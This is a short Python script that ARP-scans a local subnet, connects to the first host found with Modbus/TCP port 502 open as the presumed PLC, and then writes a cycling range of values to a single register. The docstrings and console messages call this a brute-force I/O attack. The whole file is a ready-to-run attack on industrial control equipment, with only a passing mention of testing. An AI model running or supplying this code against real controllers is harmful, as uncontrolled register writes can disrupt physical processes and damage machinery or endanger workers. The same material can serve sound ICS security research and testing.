from pymodbus.client.sync import ModbusTcpClient
from scapy.all import ARP, Ether, srp
import time
import socket

def find_plc_ip(subnet="192.168.1.0/24", modbus_port=502):
    """
    Scans the local subnet for a device with an open Modbus/TCP port (502).
    Returns the IP address of the first device found.
    """
    print(f"Scanning the network ({subnet}) for the PLC...")

    # ARP scanning to find live hosts
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=subnet), timeout=2, verbose=0)
    live_hosts = [rcv.psrc for _, rcv in ans]
    
    for host in live_hosts:
        try:
            # Check if the Modbus port (502) is open on each live host
            with socket.create_connection((host, modbus_port), timeout=1) as sock:
                print(f"PLC found at IP: {host}")
                return host
        except (socket.timeout, ConnectionRefusedError):
            continue

    raise Exception("No PLC with Modbus port 502 found on the network.")

def brute_force_io(plc_ip, target_register, start_value, end_value, delay=0.1, cycles=10):
    """
    Performs a Brute Force I/O attack on the PLC by writing a range of values
    to a single register repeatedly or across a range of values.
    """
    client = ModbusTcpClient(plc_ip)
    
    if not client.connect():
        print(f"Failed to connect to PLC at {plc_ip}")
        return
    print("Connected to PLC. Starting brute-force attack...")

    try:
        for _ in range(cycles):  # Repeat for a default number of "cycles"
            for value in range(start_value, end_value + 1):
                # Write to the target register
                result = client.write_register(target_register, value)
                if result.isError():
                    print(f"Error writing value {value} to register {target_register}")
                else:
                    print(f"Written value {value} to register {target_register}")
                
                time.sleep(delay)  # Add some delay between writes

            # Optionally reverse direction (e.g., decrement)
            for value in range(end_value, start_value - 1, -1):
                result = client.write_register(target_register, value)
                if result.isError():
                    print(f"Error writing value {value} to register {target_register}")
                else:
                    print(f"Written value {value} to register {target_register}")
                
                time.sleep(delay)
    finally:
        client.close()
        print("Attack completed, and connection to PLC closed.")

if __name__ == "__main__":
    try:
        # Step 1: Find the PLC IP
        plc_ip = find_plc_ip()

        # Step 2: Perform Brute Force I/O attack
        target_register = 1  # Example: Target register to write to (use actual for your test)
        start_value = 0      # Example: Start of value range
        end_value = 100      # Example: End of value range
        delay = 0.1          # 100 ms delay between writes
        cycles = 5           # Number of brute force cycles

        brute_force_io(plc_ip, target_register, start_value, end_value, delay, cycles)

    except Exception as e:
        print(f"Error: {e}")